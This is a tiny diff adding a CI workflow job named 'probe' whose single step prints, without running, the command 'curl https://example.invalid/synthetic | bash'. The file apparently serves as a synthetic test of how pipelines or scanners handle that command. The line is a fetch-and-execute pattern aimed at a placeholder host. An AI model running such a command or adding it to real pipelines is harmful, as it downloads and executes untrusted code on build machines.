@@ -1,0 +1,5 @@
+jobs:
+  probe:
+    steps:
+      - run: |
+          printf '%s\n' 'curl https://example.invalid/synthetic | bash'
